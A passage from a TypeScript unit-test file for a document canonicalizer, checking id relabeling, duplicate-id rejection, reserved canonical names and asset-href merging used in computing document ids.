        { type: 'academic:equation-group', id: 'eqg', lines: [{ value: 'a=b', id: 'eq-1' }] },
        {
          type: 'paragraph',
          children: [
            { type: 'text', value: 'a', marks: [{ type: 'academic:theorem-ref', target: '#thm1' }] },
            { type: 'text', value: 'b', marks: [{ type: 'academic:equation-ref', target: '#eq-1' }] },
            { type: 'text', value: 'c', marks: [{ type: 'academic:algorithm-ref', target: '#def1', line: 'loop' }] },
          ],
        },
      ],
    },
  }).blocks;
  assert.equal(blocks[1].uses[0], '#b0'); // theorem.uses → def1
  assert.equal(blocks[2].of, '#b1'); // proof.of → thm1
  const refs = blocks[4].children;
  assert.equal(refs[0].marks[0].target, '#b1'); // academic:theorem-ref → thm1
  assert.equal(refs[1].marks[0].target, '#b3'); // academic:equation-ref → equation-LINE id eq-1 (now relabeled)
  assert.equal(refs[2].marks[0].target, '#b0'); // academic:algorithm-ref target → def1
  assert.equal(refs[2].marks[0].line, 'loop'); // academic:algorithm-ref.line: separate namespace, verbatim
  assert.equal(blocks[3].lines[0].id, 'b3'); // equation-line id now shares the relabeled namespace
});

test('relabel: semantic:ref and presentation:reference block targets are rewritten', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'h', level: 1, children: [{ type: 'text', value: 'H' }] },
        { type: 'semantic:ref', target: '#h', children: [] },
        { type: 'presentation:reference', target: '#h', format: 'Fig #' },
      ],
    },
  }).blocks;
  assert.equal(blocks[1].target, '#b0');
  assert.equal(blocks[2].target, '#b0');
});

test('relabel: a NON-ARRAY `marks` value is handled without throwing, and differs from the array form', () => {
  // §4.3.1 item 3 and the mark-collection dispatch both assume `marks` is an array;
  // content.schema.json requires it. This pins what happens to the schema-INVALID object
  // form, which no document-id vector should assert: those publish byte-exact expectations
  // a conformant implementation must reproduce, and one that rejects this at schema
  // validation could never run it.
  //
  // The behaviour is recorded, NOT endorsed. The identical node is left as authored inside
  // a valid `marks` array but relabelled inside the object form, so the difference comes
  // from `walkContentNodes`' `Array.isArray` gate rather than from a rule §4.3.1 states —
  // and item 5 arguably excludes it anyway, as "an identifier carried on a singular named
  // sub-object". Recorded as an open question rather than settled here; this test exists so
  // the answer, whichever way it goes, is a deliberate change and not silent drift.
  const widget = '{"type":"x:widget","id":"leak","crdt":{"z":1}}';
  const doc = (marks: string): string =>
    `{"version":"0.1","blocks":[{"type":"heading","id":"intro","level":1,"children":[{"type":"text","value":"H"}]},` +
    `{"type":"paragraph","children":[{"type":"text","value":"x","marks":${marks}}]}]}`;
  const canon = (marks: string): any =>
    canonContent({ content: JSON.parse(doc(marks)) as unknown as Record<string, unknown> });

  const asArray = canon(`[${widget}]`);
  assert.equal(asArray.blocks[1].children[0].marks[0].id, 'leak', 'inside a valid array the id is left as authored');

  const asObject = canon(widget);
  assert.equal(asObject.blocks[0].id, 'b0', 'the heading still relabels either way');
  assert.equal(
    asObject.blocks[1].children[0].marks.id,
    'b1',
    'the object form sweeps the id into the relabelled namespace — the divergence being pinned',
  );
  assert.deepEqual(asObject.blocks[1].children[0].marks.crdt, { z: 1 }, 'a mark is neither a block nor a text node, so item 1 never strips its crdt');
});

test('relabel: a footnote BLOCK id and the footnote MARK id are BOTH left verbatim, so id-match survives canonicalization', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'footnote', number: 1, id: 'fn1' }] }] },
        { type: 'semantic:footnote', number: 1, id: 'fn1', children: [{ type: 'paragraph', children: [{ type: 'text', value: 'note' }] }] },
      ],
    },
  }).blocks;
  // The mark's id addresses a separate namespace and was always verbatim. The BLOCK's
  // id used to relabel to `b0`, which left Semantic Extension §4.5.2's id-match rule
  // ("when both carry an id, the ids match") unsatisfiable on the canonical form: the
  // mark said `fn1` and the block said `b0`. Preserving the definition is what makes
  // that rule true post-canonicalization, and equality here is the assertion.
  assert.equal(blocks[0].children[0].marks[0].id, 'fn1');
  assert.equal(blocks[1].id, 'fn1');
  assert.equal(blocks[0].children[0].marks[0].id, blocks[1].id, 'id-match must hold on the canonical form');
});

// ---------------------------------------------------------------------------
// Preserved extension-block ids (§4.3.1 item 5; DD-022)
//
// The decision was "relabelling only": a `semantic:term` / `semantic:footnote` id
// is left as authored but STAYS in the shared uniqueness-and-anchor namespace. The
// rejected alternative was to remove it from the namespace entirely. The two are
// indistinguishable if you only assert that the id survives — what separates them
// is that anchors still resolve to it and a duplicate is still a collision, which
// the next three tests pin.
// ---------------------------------------------------------------------------

test('preserved id: a link href resolves to a preserved term id, so it stays in the anchor namespace', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'semantic:term', id: 'term-algo', term: 'Algorithm', definition: 'A finite procedure.' },
        { type: 'paragraph', children: [{ type: 'text', value: 'see', marks: [{ type: 'link', href: '#term-algo' }] }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'term-algo', 'the term id is left as authored');
  // Had the id LEFT the namespace, this href would be an unresolved cross-document
  // anchor — still `#term-algo` by pass-through, but pointing at nothing. It resolves
  // because both sides now spell the same name.
  assert.equal(blocks[1].children[0].marks[0].href, '#term-algo');
});

test('preserved id: a duplicate term id is STILL a collision — membership did not change', () => {
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [
            { type: 'semantic:term', id: 'dup', term: 'A', definition: 'D1' },
            { type: 'semantic:term', id: 'dup', term: 'B', definition: 'D2' },
          ],
        },
      }),
    /duplicate id "dup"/,
  );
});

test('preserved id: it collides with an ordinary block id too — one namespace, not two', () => {
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [
            { type: 'paragraph', id: 'shared', children: [{ type: 'text', value: 'x' }] },
            { type: 'semantic:term', id: 'shared', term: 'A', definition: 'D' },
          ],
        },
      }),
    /duplicate id "shared"/,
  );
});

test('preserved id: the b<i> sequence COMPACTS — a preserved id consumes no index', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'semantic:footnote', id: 'fn1', number: 1, children: [] },
        { type: 'paragraph', id: 'p1', children: [{ type: 'text', value: 'x' }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'fn1');
  // `b0`, NOT `b1`. Reserving the index is equally implementable and yields a
  // different document ID for identical content, which is why §4.3.1 item 5 states
  // which one applies rather than leaving it to the implementation.
  assert.equal(blocks[1].id, 'b0', 'the preserved occurrence takes no name from the sequence');
});

test('preserved id: an authored id spelling b<digits> is rejected', () => {
  // Load-bearing. Duplicate detection compares AUTHORED ids, so this authored `b0`
  // does not collide with the `b0` generated for the paragraph — without this guard
  // both reach the canonical output carrying `id: "b0"`, and a `#b0` reference binds
  // to whichever the reader meets first.
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [
            { type: 'paragraph', id: 'p1', children: [{ type: 'text', value: 'x' }] },
            { type: 'semantic:term', id: 'b0', term: 'A', definition: 'D' },
          ],
        },
      }),
    /id "b0" uses the reserved canonical-name form/,
  );
});

test('preserved id: the b<digits> prohibition fires with no other id present', () => {
  // The zero-relabelled-id path: nothing populates the rename map, so this is the
  // case an early return would have skipped.
  assert.throws(
    () =>
      canonContent({
        content: { version: '0.1', blocks: [{ type: 'semantic:term', id: 'b7', term: 'A', definition: 'D' }] },
      }),
    /id "b7" uses the reserved canonical-name form/,
  );
});

test('relabel: an unresolved #b<digits> is rejected when EVERY defined id is preserved', () => {
  // The sibling of the no-ids-at-all case below, and the arm the comment in
  // `alphaRenameIds` names second. Here the namespace is non-empty but the rename map is
  // empty, so an early return keyed on the MAP rather than the NAMESPACE skips the
  // rewriting pass and accepts this. That mutant passes every unit test without this one.
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [
            { type: 'semantic:term', id: 'term-x', term: 'X', definition: 'D' },
            { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#b0' }] }] },
          ],
        },
      }),
    /reference "#b0" uses the reserved canonical-name form/,
  );
});

test('relabel: a `marks` array that is NOT a text node\'s is left unsorted, so it stays content-significant', () => {
  // §4.3.1 item 3 is scoped "within each text node" and `canon` normalizes marks under
  // `case 'text'` alone. `rewriteIds` walks every `marks` array, so re-sorting there
  // unconditionally would normalize a field the canonical form never touched. A JSON-LD
  // annotation permits arbitrary members, so `attributes.semantic.marks` is a reachable
  // vehicle — and these two documents would otherwise collapse onto one document id.
  const mk = (marks: string[]) => ({
    content: {
      version: '0.1',
      blocks: [{ type: 'paragraph', attributes: { semantic: { '@type': 'X', marks } }, children: [{ type: 'text', value: 'x' }] }],
    },
  });
  const a = JSON.stringify(canonContent(mk(['italic', 'bold'])));
  const b = JSON.stringify(canonContent(mk(['bold', 'italic'])));
  assert.notEqual(a, b, 'a non-text-node `marks` array must keep its authored order');
  // The text-node case still normalizes, which is what item 5's closing sentence requires.
  const t = (marks: unknown[]) => ({
    content: { version: '0.1', blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks }] }] },
  });
  assert.equal(
    JSON.stringify(canonContent(t(['italic', 'bold']))),
    JSON.stringify(canonContent(t(['bold', 'italic']))),
    "a TEXT node's marks are still sorted",
  );
});

test('relabel: an unresolved #b<digits> is rejected even when the document defines NO ids', () => {
  // Regression for a hole that predates the preserved-id work: `alphaRenameIds`
  // early-returned when the namespace was empty, so `rewriteIds` never ran and this
  // reference was ACCEPTED — while the identical reference beside one real id was
  // rejected. A document carrying only preserved ids takes the same path.
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#b0' }] }] }],
        },
      }),
    /reference "#b0" uses the reserved canonical-name form/,
  );
});

test('relabel: separate-namespace mark fields are verbatim even when equal to a block id', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          id: 'p',
          children: [
            { type: 'text', value: 'a', marks: [{ type: 'glossary', ref: 'p' }] },
            { type: 'text', value: 'b', marks: [{ type: 'citation', refs: ['p'] }] },
          ],
        },
      ],
    },
  }).blocks[0].children;
  // 'p' is a block id (→ b0), but glossary.ref / citation.refs are NOT anchor refs,
  // so they keep the literal 'p' even though it coincides with a block id.
  assert.equal(children[0].marks[0].ref, 'p');
  assert.equal(children[1].marks[0].refs[0], 'p');
});

test('relabel: sub-block ids (subfigure, equation-line) join the relabeled namespace', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'figure', id: 'fig', subfigures: [{ id: 'sub-a', label: 'a', children: [{ type: 'paragraph', children: [{ type: 'text', value: 'x' }] }] }] },
        { type: 'academic:equation-group', id: 'eqg', lines: [{ value: 'a', id: 'line-1' }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'b0'); // figure block id → relabeled
  assert.equal(blocks[0].subfigures[0].id, 'b1'); // subfigure (no type) now relabeled, after its parent
  assert.equal(blocks[1].id, 'b2'); // equation-group block id → relabeled (b2: subfigure took b1)
  assert.equal(blocks[1].lines[0].id, 'b3'); // equation-line (no type) now relabeled
});

test('relabel: a signature signer.id is a Person id (named sub-object), not relabeled', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'paragraph', id: 'intro', children: [] },
        { type: 'signature', signatureType: 'handwritten', signer: { name: 'A', id: 'intro' } },
      ],
    },
  }).blocks;
  // The signer is a singular named sub-object (not an array item), so its id is a
  // Person identifier outside the anchor namespace: it collides with the block id
  // 'intro' by label but is neither relabeled nor treated as a duplicate.
  assert.equal(blocks[0].id, 'b0'); // paragraph block id → relabeled
  assert.equal(blocks[1].signer.id, 'intro'); // signer id → verbatim, no collision error
});

test('relabel: a bibliography entry key (separate namespace) is not relabeled, even when it equals a block id', () => {
  // A semantic:bibliography inline entry carries a string id (CSL citation key) AND a
  // string type (CSL type), so a shape heuristic mistakes it for a block. Its id is a
  // separate namespace: it must stay verbatim, and it must NOT count as a duplicate of
  // a block that happens to share the label.
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'smith2024', level: 1, children: [{ type: 'text', value: 'H' }] },
        { type: 'semantic:bibliography', id: 'bib', entries: [{ id: 'smith2024', type: 'article-journal', title: 'A' }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'b0'); // heading block id → relabeled
  assert.equal(blocks[1].id, 'b1'); // bibliography block id → relabeled
  assert.equal(blocks[1].entries[0].id, 'smith2024'); // entry key → verbatim, no false duplicate
});

test('id: changing only a bibliography entry key (citation ref unchanged) changes the id (collision closed)', () => {
  // The malleability the fix closes: under the old heuristic the entry key was
  // relabeled to bN while the citation ref stayed on the authored key, so changing the
  // key produced the SAME document id — collapsing two different bibliographies onto one
  // identity. The key is now hashed verbatim, so the two documents have distinct ids.
  const doc = (key: string) => ({
    version: '0.1',
    blocks: [
      { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'citation', refs: ['smith2024'] }] }] },
      { type: 'semantic:bibliography', id: 'bib', entries: [{ id: key, type: 'article-journal' }] },
    ],
  });
  assert.notEqual(
    computeDocumentId(makeParts({ content: doc('smith2024') }), 'sha256'),
    computeDocumentId(makeParts({ content: doc('smith2099') }), 'sha256'),
  );
});

test('relabel: an id in an extension block\'s own data array (not `lines`/`subfigures`) is not relabeled', () => {
  // An unknown namespaced block (open escape) carries an id-bearing object in an
  // `items` array. Only `lines`/`subfigures` array-item ids join the relabeled
  // namespace, so the nested id stays verbatim — a future extension's separate
  // namespace is not swept in merely because a node has an id and sits in an array.
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'h', level: 2, children: [{ type: 'text', value: 'X' }] },
        { type: 'x:widget', id: 'w', items: [{ id: 'k', label: 'L' }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'b0'); // heading block id → relabeled
  assert.equal(blocks[1].id, 'b1'); // extension block id → relabeled
  assert.equal(blocks[1].items[0].id, 'k'); // untyped id in a non-sub-block array → verbatim
});

test('relabel: a duplicate id in the shared identifier namespace is rejected', () => {
  assert.throws(
    () =>
      canonContent({
        content: { version: '0.1', blocks: [
          { type: 'paragraph', id: 'dup', children: [] },
          { type: 'paragraph', id: 'dup', children: [] },
        ] },
      }),
    CanonicalizationError,
  );
});

test('relabel: identical anchor marks in a NON-text marks array still collide', () => {
  // canon dedups a marks array only under `case 'text'`, so byte-identical anchor
  // marks hanging off a non-text node survive into alphaRenameIds and collide. Pins
  // the boundary of collectDefinedIds's rawInput dedup: that dedup mirrors canon and
  // is therefore text-node-only, and it is OFF for the canonical path entirely.
  // Applying it unconditionally would stop this input being rejected — a silent
  // widening of what computeDocumentId accepts, which nothing else here would catch.
  assert.throws(
    () =>
      canonContent({
        content: { version: '0.1', blocks: [
          { type: 'paragraph', marks: [{ type: 'anchor', id: 'a' }, { type: 'anchor', id: 'a' }], children: [] },
        ] },
      }),
    CanonicalizationError,
  );
});

test('collectDefinedIds: rawInput reproduces canon, checked AGAINST canon', () => {
  // The property that matters is agreement, so assert it differentially rather than
  // against hand-written expectations: for each input, the raw namespace must have a
  // duplicate exactly when computeDocumentId rejects the document for one. A one-sided
  // erasure (missing or over-eager) breaks one direction or the other.
  const rejectsForDuplicateId = (content: unknown): boolean => {
    try {
      computeDocumentId({ manifest: '{}', content: JSON.stringify(content), dublinCore: '{}' }, 'sha256');
      return false;
    } catch (err) {
      return err instanceof CanonicalizationError && /duplicate id/.test(err.message);
    }
  };
  const anchor = (id: string) => ({ type: 'anchor', id });
  const cases: Array<[string, unknown]> = [
    // merged away by §4.3.1 item 4 -> one id
    ['adjacent identical marks', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x')] }, { type: 'text', value: 'b', marks: [anchor('x')] }] }] }],
    // a non-text sibling breaks the run -> both survive -> collision
    ['separated by a break', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x')] }, { type: 'break' }, { type: 'text', value: 'b', marks: [anchor('x')] }] }] }],
    // differing mark sets are not mergeable -> collision
    ['differing mark sets', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x')] }, { type: 'text', value: 'b', marks: [anchor('x'), 'bold'] }] }] }],
    // an id-bearing text node is not merge-eligible -> both marks survive -> collision
    ['id-bearing text node blocks the merge', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', id: 't', value: 'a', marks: [anchor('x')] }, { type: 'text', value: 'b', marks: [anchor('x')] }] }] }],
    // canon strips crdt on a typed BLOCK -> interior id absent
    ['crdt on a block', { blocks: [{ type: 'paragraph', id: 'p', crdt: { blocks: [{ type: 'paragraph', id: 'p' }] }, children: [] }] }],
    // `display` and `tokens` are stripped ONLY from measurement / codeBlock; on any
    // other type they are ordinary fields, so ids inside them stay in the namespace
    ['display on a non-measurement block', { blocks: [{ type: 'paragraph', id: 'p', display: { type: 'paragraph', id: 'p' }, children: [] }] }],
    ['display on a measurement block', { blocks: [{ type: 'measurement', id: 'm', display: { type: 'paragraph', id: 'm' } }] }],
    ['tokens on a non-codeBlock block', { blocks: [{ type: 'paragraph', id: 'p', tokens: [{ type: 'paragraph', id: 'p' }], children: [] }] }],
    ['tokens on a codeBlock', { blocks: [{ type: 'codeBlock', id: 'c', tokens: [{ type: 'paragraph', id: 'c' }] }] }],
    // canon strips crdt only under a TYPED node, so an equation line (untyped, but in the
    // namespace as a `lines` item) keeps its crdt and the id inside it collides
    ['crdt on an untyped sub-block', { blocks: [
      { type: 'academic:equation-group', id: 'eqg', lines: [{ value: 'a=b', id: 'L', crdt: { type: 'paragraph', id: 'L' } }] }] }],
    // canon strips derived fields BEFORE merging, so a crdt-bearing text node is still
    // merge-eligible — testing mergeability on the raw keys would keep both marks
    ['crdt on the absorbed text node', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x')] },
      { type: 'text', value: 'b', marks: [anchor('x')], crdt: { v: 1 } }] }] }],
    ['crdt on the surviving text node', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x')], crdt: { v: 1 } },
      { type: 'text', value: 'b', marks: [anchor('x')] }] }] }],
    // canon's marks skip has no array test, so a non-array `marks` on a TEXT node keeps
    // its whole subtree — including a crdt whose ids are then relabelled
    ['non-array marks on a text node, crdt inside', { blocks: [{ type: 'paragraph', id: 'p1', children: [
      { type: 'text', value: 'a', marks: { type: 'academic:theorem', crdt: { type: 'paragraph', id: 'p1' } } }] }] }],
    // ... and marksEqual compares that raw value, so differing non-array marks do NOT merge
    ['non-array marks differing', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: { type: 'anchor', id: 'x' } },
      { type: 'text', value: 'b', marks: { type: 'anchor', id: 'x', z: 1 } }] }] }],
    ['non-array marks identical', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: { type: 'anchor', id: 'x' } },
      { type: 'text', value: 'b', marks: { type: 'anchor', id: 'x' } }] }] }],
    // canon does NOT recurse into a text node's marks -> a crdt there SURVIVES
    ['crdt on a mark', { blocks: [
      { type: 'paragraph', id: 'p', children: [{ type: 'text', value: 'v', marks: [{ ...anchor('a'), crdt: { type: 'paragraph', id: 'p' } }] }] }] }],
    // marks dedup within one text node -> one id
    ['duplicate marks in one text node', { blocks: [{ type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [anchor('x'), anchor('x')] }] }] }],
    // ... but canon dedups marks ONLY for a text node
    ['duplicate marks on a non-text node', { blocks: [{ type: 'paragraph', marks: [anchor('x'), anchor('x')], children: [] }] }],
    // Beneath `attributes` nothing is content: the merge does not run and no id is defined,
    // so BOTH sides must be silent. These rows do not pin the barrier on their own — the raw
    // walk and canon share `definedId`, so removing it moves them together — they pin that
    // the two sides never move APART, which is the property this differential exists for.
    ['duplicate anchor id under attributes.semantic', { blocks: [{ type: 'paragraph', attributes: { semantic: {
      '@type': 'Q', children: [{ type: 'text', value: 'a', marks: [anchor('dup')] }, { type: 'text', value: 'b', marks: [anchor('dup')] }] } },
      children: [{ type: 'text', value: 'ok' }] }] }],
    ['duplicate block id under attributes.semantic', { blocks: [{ type: 'paragraph', attributes: { semantic: {
      '@type': 'Q', children: [{ type: 'paragraph', id: 'dup', children: [] }, { type: 'paragraph', id: 'dup', children: [] }] } },
      children: [] }] }],
  ];
  for (const [label, content] of cases) {
    const { duplicates } = collectDefinedIds(content, { rawInput: true });
    assert.equal(duplicates.length > 0, rejectsForDuplicateId(content), `raw walk disagrees with canonicalization: ${label}`);
  }
});

test("a text node's id must not spell a canonical name", () => {
  // Item 5's prohibition is scoped to namespace MEMBERS. A text node is not one, so an
  // authored `b0` there reached the canonical output beside a generated `b0` and two
  // identifiers arrived under one name — the collapse that prohibition exists to prevent.
  const parts = (content: unknown) => ({ manifest: '{}', content: JSON.stringify(content), dublinCore: '{}' });
  assert.throws(
    () => computeDocumentId(parts({ blocks: [{ type: 'paragraph', id: 'real', children: [{ type: 'text', id: 'b0', value: 'x' }] }] }), 'sha256'),
    /reserved canonical-name form/,
  );

  // A text-node id that does NOT spell one is still preserved verbatim — the check must not
  // have become a blanket ban on text-node ids.
  const ok = canonicalContent(parts({ blocks: [{ type: 'paragraph', id: 'real', children: [{ type: 'text', id: 'keepme', value: 'x' }] }] })) as any;
  assert.equal(ok.content.blocks[0].children[0].id, 'keepme');
  assert.equal(ok.content.blocks[0].id, 'b0', 'and the real block still relabels');

  // The prohibition is about the CANONICAL form, so it must fire on a nested text node too.
  assert.throws(
    () => computeDocumentId(parts({ blocks: [{ type: 'blockquote', children: [{ type: 'paragraph', children: [{ type: 'text', id: 'b12', value: 'x' }] }] }] }), 'sha256'),
    /reserved canonical-name form/,
  );

  // Barriered like every other rule. A JSON-LD annotation may carry a text-SHAPED member whose
  // `id` names nothing, so no generated name can collide with it; rejecting it would be a false
  // REJECT on a schema-valid document, which is the defect this scoping exists to remove.
  assert.doesNotThrow(() => computeDocumentId(parts({ blocks: [{ type: 'paragraph',
    attributes: { semantic: { '@type': 'Q', foo: { type: 'text', id: 'b0', value: 'x' } } }, children: [] }] }), 'sha256'));

  // Keyed on POSITION, not shape. A CSL `entries` member is a data payload whose id item 5
  // leaves as authored, so nothing generated can collide with it — a shape test rejects it.
  assert.doesNotThrow(() => computeDocumentId(parts({ blocks: [{ type: 'semantic:bibliography',
    entries: [{ id: 'b0', type: 'text', value: 'x' }] }] }), 'sha256'));
});

test('an id under `attributes` is preserved, not relabeled', () => {
  const parts = (content: unknown) => ({ manifest: '{}', content: JSON.stringify(content), dublinCore: '{}' });
  const canon = (content: unknown) => canonicalContent(parts(content)) as any;
  const cited = (k1: string, k2: string) => ({ blocks: [{ type: 'paragraph',
    attributes: { semantic: { citation: [{ id: k1, type: 'article-journal' }, { id: k2, type: 'book' }] } },
    children: [{ type: 'text', value: 'x' }] }] });

  // Alpha-equivalence is for author-chosen LABELS. Applied to third-party vocabulary data it
  // erases content: two bibliographies with different citation keys hashed identically, so a
  // signature over one verified the other.
  assert.notEqual(
    computeDocumentId(parts(cited('smith2020', 'jones2019')), 'sha256'),
    computeDocumentId(parts(cited('OTHER-KEY', 'DIFFERENT')), 'sha256'),
  );
  assert.equal(canon(cited('smith2020', 'jones2019')).content.blocks[0].attributes.semantic.citation[0].id, 'smith2020');

  // Preserved means preserved-and-still-counted: it consumes no index, so a real sibling takes
  // the name the preserved occurrence would have had (§4.3.1 item 5).
  const shifted = canon({ blocks: [
    { type: 'paragraph', attributes: { semantic: { '@type': 'Q', note: { type: 'heading', id: 'ghost', children: [] } } }, children: [] },
    { type: 'paragraph', id: 'real', children: [] }] });
  assert.equal(shifted.content.blocks[0].attributes.semantic.note.id, 'ghost');
  assert.equal(shifted.content.blocks[1].id, 'b0', 'the preserved occurrence consumed no index');

  // ... and still in the UNIQUENESS namespace. That material is reachable — a `link` href
  // resolves into it — so a duplicate there is a real collision, not a false positive.
  assert.throws(() => computeDocumentId(parts({ blocks: [
    { type: 'paragraph', id: 'dup', children: [] },
    { type: 'paragraph', attributes: { semantic: { '@type': 'Q', n: { type: 'heading', id: 'dup', children: [] } } }, children: [] }] }), 'sha256'),
    /duplicate id/);

  // A reference INTO the barriered subtree keeps resolving, because the target keeps its name.
  const linked = canon({ blocks: [{ type: 'paragraph',
    attributes: { semantic: { '@type': 'Q', children: [{ type: 'text', value: 't', marks: [{ type: 'anchor', id: 'hidden' }] }] } },
    children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#hidden' }] }] }] });
  assert.equal(linked.content.blocks[0].children[0].marks[0].href, '#hidden');

  // Inherits item 5's canonical-name prohibition: left as authored beside a generated `b0`,
  // two identifiers would reach the canonical output under one name.
  assert.throws(() => computeDocumentId(parts({ blocks: [{ type: 'paragraph',
    attributes: { semantic: { '@type': 'Q', n: { type: 'heading', id: 'b0', children: [] } } }, children: [] }] }), 'sha256'),
    /reserved canonical-name form/);

  // CONTROL. Ordinary content must be untouched by all of the above — without this the
  // assertions are equally satisfied by a canonicalizer that stopped relabeling entirely.
  const plain = canon({ blocks: [{ type: 'paragraph', id: 'p1', children: [{ type: 'text', value: 't', marks: [{ type: 'anchor', id: 'a2' }] }] }] });
  assert.equal(plain.content.blocks[0].id, 'b0', 'a real block still relabels');
  assert.equal(plain.content.blocks[0].children[0].marks[0].id, 'b1', 'and a real anchor mark still relabels');
});

// --- The asset map in the raw walk (B1b-3b-2) --------------------------------
// `normalizeMarks` resolves a `link` mark's href to its asset HASH before
// `mergeAdjacentText` compares mark sets, so whether two adjacent text nodes merge — and
// therefore whether a shared `anchor` id is ONE id or a COLLISION — depends on the asset
// index. These fixtures are shared by the tests below.
const ASSET_HASH_A = `sha256:${'a'.repeat(64)}`;
const ASSET_HASH_B = `sha256:${'b'.repeat(64)}`;
const ASSET_MANIFEST = '{"assets":{"images":{"index":"assets/images/index.json"}}}';
const ASSET_INDEX = JSON.stringify({
  assets: [
    { id: 'a', path: 'a.png', hash: ASSET_HASH_A },
    { id: 'alias', path: 'alias.png', hash: ASSET_HASH_A }, // same bytes, second path
    { id: 'b', path: 'b.png', hash: ASSET_HASH_B },
  ],
});

/** Two adjacent text nodes sharing the anchor id `x`, each carrying one `link` mark. */
const twoLinkedTexts = (hrefA: string, hrefB: string, extra: Record<string, unknown> = {}): unknown => ({
  version: '0.1',
  blocks: [
    { type: 'paragraph', children: [
      { type: 'text', value: 'a', marks: [{ type: 'anchor', id: 'x' }, { type: 'link', href: hrefA, ...extra }] },
      { type: 'text', value: 'b', marks: [{ type: 'anchor', id: 'x' }, { type: 'link', href: hrefB, ...extra }] },
    ] },
  ],
});

test('collectDefinedIds: the asset map reproduces canon merging, checked AGAINST canon', () => {
  // Differential, as the erasure test above: for each input the raw namespace must have a
  // duplicate exactly when computeDocumentId rejects for one. Before the map existed every
  // packaged-asset href keyed as one placeholder, so `distinct assets` below was a MISSED
  // collision — a real INTEGRITY-ERROR the raw walk could not see.
  const assetMap = buildAssetMap(JSON.parse(ASSET_MANIFEST), { images: ASSET_INDEX });
  const rejectsForDuplicateId = (content: unknown): boolean => {
    try {
      computeDocumentId(
        { manifest: ASSET_MANIFEST, content: JSON.stringify(content), dublinCore: '{}', assetIndexes: { images: ASSET_INDEX } },
        'sha256',
      );
      return false;
    } catch (err) {
      if (err instanceof CanonicalizationError && /duplicate id/.test(err.message)) return true;
      throw err; // any other rejection means the case is not testing what it claims
    }
  };
  const cases: Array<[string, unknown]> = [
    // same bytes under two paths -> resolved hrefs are equal -> merged -> one id
    ['aliased assets merge', twoLinkedTexts('assets/images/a.png', 'assets/images/alias.png')],
    ['identical hrefs merge', twoLinkedTexts('assets/images/a.png', 'assets/images/a.png')],
    // `resolveAssetRef` normalizes before the map lookup, so `./` is the SAME asset
    ['a dot-segment path is the same asset', twoLinkedTexts('assets/images/a.png', './assets/images/a.png')],
    // DIFFERENT bytes -> hrefs stay distinct -> no merge -> both anchors survive -> collision
    ['distinct assets do NOT merge', twoLinkedTexts('assets/images/a.png', 'assets/images/b.png')],
    // `normalizeMarks` passes `external: false` for a LINK mark unconditionally, so the flag
    // that exempts an image/svg/signature source does nothing here and the href still resolves
    ['external on a link mark does not exempt it', twoLinkedTexts('assets/images/a.png', 'assets/images/alias.png', { external: true })],
    // non-asset hrefs are left verbatim by both, so distinct ones keep the nodes apart
    ['scheme-bearing hrefs are not asset refs', twoLinkedTexts('https://example.test/a', 'https://example.test/b')],
    ['identical scheme-bearing hrefs merge', twoLinkedTexts('https://example.test/a', 'https://example.test/a')],
    // a relative path outside `assets/` is not a packaged-asset reference either
    ['non-asset relative paths are not asset refs', twoLinkedTexts('images/a.png', 'images/b.png')],
  ];
  for (const [label, content] of cases) {
    const { duplicates } = collectDefinedIds(content, { rawInput: true, assetMap });
    assert.equal(duplicates.length > 0, rejectsForDuplicateId(content), `raw walk disagrees with canonicalization: ${label}`);
  }
});

test('collectDefinedIds: the merge key consults the asset map BEFORE testing the assets/ prefix', () => {
  // `resolveAssetRef` consults the map for ANY href that is not `#`-prefixed and carries no
  // scheme; only the FALLBACK is gated on `assets/`-rootedness. That distinction is invisible
  // while every map key is `assets/`-rooted — but `buildAssetMap` does not constrain an index
  // entry's `path`, so an entry escaping its category directory registers a key that is not.
  // A merge key that gated the LOOKUP on the prefix would then resolve one spelling of that
  // asset and leave the other verbatim, keep the nodes apart, and report a duplicate id the
  // canonicalizer does not — a FALSE INTEGRITY-ERROR.
  const hash = `sha256:${'c'.repeat(64)}`;
  const manifest = '{"assets":{"images":{"index":"assets/images/index.json"}}}';
